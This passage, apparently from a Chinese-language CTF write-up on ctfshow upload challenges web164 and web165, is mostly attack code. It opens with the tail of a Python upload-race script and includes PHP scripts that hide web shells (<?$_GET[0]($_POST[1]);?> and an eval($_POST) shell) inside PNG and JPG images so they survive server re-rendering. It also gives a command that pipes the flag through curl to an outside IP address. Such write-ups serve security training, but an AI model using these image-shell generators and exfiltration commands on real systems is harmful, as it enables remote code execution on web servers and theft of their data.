</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">log</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">log1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp1_url</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">log</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">log1</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;ctfshow&#34;</span> <span class="ow">in</span> <span class="n">log1</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;getflag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">break</span>
</span></span></code></pre></div><p><img alt="image-20250127183202416" loading="lazy" src="./assets/image-20250127183202416.png"></p>
<h4 id="web164">web164<a hidden class="anchor" aria-hidden="true" href="#web164">#</a></h4>
<p><img alt="image-20250127194845782" loading="lazy" src="./assets/image-20250127194845782.png"></p>
<p>这题随便传个图片试试发现多了个查看图片</p>
<pre tabindex="0"><code>https://775e9cd3-3a73-47a1-b31d-7b4450ec5573.challenge.ctf.show/download.php?image=94f7678cc4cda39c02c7890bc8fe6941.png
</code></pre><p><img alt="image-20250127194925361" loading="lazy" src="./assets/image-20250127194925361.png"></p>
<p>从url我们可以看出这题存在图片包含</p>
<p>我们可以利用这个文件包含去执行我们的图片马</p>
<p>大佬的脚本，可以绕过二次渲染</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">           <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">           <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">           <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">           <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">           <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">           <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">           <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nv">$img</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">   <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">   <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">   <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">   <span class="nv">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">   <span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;./1.png&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><pre tabindex="0"><code>图片马的内容 &lt;?$_GET[0]($_POST[1]);?&gt;
</code></pre><p>没有回显</p>
<p>外带读flag</p>
<pre tabindex="0"><code>POST 1=cat f* | curl -X POST -d @- http://106.55.168.231:7777/
GET 0=system
</code></pre><h4 id="web165">web165<a hidden class="anchor" aria-hidden="true" href="#web165">#</a></h4>
<p>这题考察的也是图片马，但是是用jpg的图片马绕过二次渲染</p>
<p>大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">  1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="cm">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="cm">    It is necessary that the size and quality of the initial image are the same as those of the processed image.
</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="cm">    1) Upload an arbitrary image via secured files upload script
</span></span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="cm">    2) Save the processed image and launch:
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="cm">    jpg_payload.php &lt;jpg_name.jpg&gt;
</span></span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="cm">    In case of successful injection you will get a specially crafted image, which should be uploaded again.
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="cm">    Since the most straightforward injection method is used, the following problems can occur:
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="cm">    1) After the second processing the injected data may become partially corrupted.
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="cm">    2) The jpg_payload.php script outputs &#34;Something&#39;s wrong&#34;.
</span></span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="cm">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
</span></span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="cm">    Sergey Bobrov @Black2Fan.
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="cm">    See also:
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="cm">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="ln"> 24</span><span class="cl">		
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">    <span class="nv">$miniPayload</span> <span class="o">=</span> <span class="s2">&#34;&lt;?=eval(</span><span class="se">\$</span><span class="s2">_POST[7]);?&gt;&#34;</span><span class="p">;</span> <span class="c1">//注意$转义
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="ln"> 27</span><span class="cl">
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;gd&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;imagecreatefromjpeg&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php-gd is not installed&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 30</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">
</span></span><span class="line"><span class="ln"> 32</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 34</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 35</span><span class="cl">
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">    <span class="nx">set_error_handler</span><span class="p">(</span><span class="s2">&#34;custom_error_handler&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl">
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$pad</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$pad</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="nv">$pad</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">        <span class="nv">$nullbytePayloadSize</span> <span class="o">=</span> <span class="nv">$pad</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">        <span class="nv">$dis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataInputStream</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl">        <span class="nv">$outStream</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">        <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 44</span><span class="cl">
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">!=</span> <span class="mh">0xFFD8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Incorrect SOI marker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 48</span><span class="cl">
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">        <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">==</span> <span class="mh">0xFF</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">            <span class="nv">$marker</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">            <span class="nv">$size</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">            <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">skip</span><span class="p">(</span><span class="nv">$size</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$marker</span> <span class="o">===</span> <span class="mh">0xDA</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl">                <span class="nv">$startPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">                <span class="nv">$outStreamTmp</span> <span class="o">=</span> 
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">                    <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">                    <span class="nv">$miniPayload</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">                    <span class="nx">str_repeat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 59</span><span class="cl">                    <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">                <span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStreamTmp</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nv">$extraBytes</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl">                    <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 63</span><span class="cl">                        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">===</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl">                            <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span> <span class="o">!==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">                                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">                            <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">                    <span class="nv">$stopPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">                    <span class="nv">$imageStreamSize</span> <span class="o">=</span> <span class="nv">$stopPos</span> <span class="o">-</span> <span class="nv">$startPos</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">                    <span class="nv">$outStream</span> <span class="o">=</span> 
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">                        <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">                        <span class="nv">$miniPayload</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">                        <span class="nx">substr</span><span class="p">(</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">                            <span class="nx">str_repeat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">                                <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">,</span> <span class="nv">$imageStreamSize</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                            <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">                            <span class="nv">$nullbytePayloadSize</span><span class="o">+</span><span class="nv">$imageStreamSize</span><span class="o">-</span><span class="nv">$extraBytes</span><span class="p">)</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 79</span><span class="cl">                                <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$stopPos</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$correctImage</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                    <span class="nv">$outStream</span> <span class="o">=</span> <span class="nv">$outStreamTmp</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStream</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Success!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 92</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Something\&#39;s wrong&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">    <span class="k">function</span> <span class="nf">checkImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$unlink</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">        <span class="k">global</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$unlink</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">        <span class="k">return</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">
</span></span><span class="line"><span class="ln">106</span><span class="cl">    <span class="k">function</span> <span class="nf">custom_error_handler</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$errfile</span><span class="p">,</span> <span class="nv">$errline</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl">        <span class="k">global</span> <span class="nv">$extraBytes</span><span class="p">,</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">109</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\d+) extraneous bytes before marker/&#39;</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$m</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">111</span><span class="cl">                <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">112</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">113</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl">
</span></span><span class="line"><span class="ln">116</span><span class="cl">    <span class="k">class</span> <span class="nc">DataInputStream</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">        <span class="k">private</span> <span class="nv">$binData</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">118</span><span class="cl">        <span class="k">private</span> <span class="nv">$order</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">        <span class="k">private</span> <span class="nv">$size</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">120</span><span class="cl">
</span></span><span class="line"><span class="ln">121</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$order</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$fromString</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">122</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">123</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span> <span class="o">=</span> <span class="nv">$order</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fromString</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">125</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File not exists [&#39;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">129</span><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
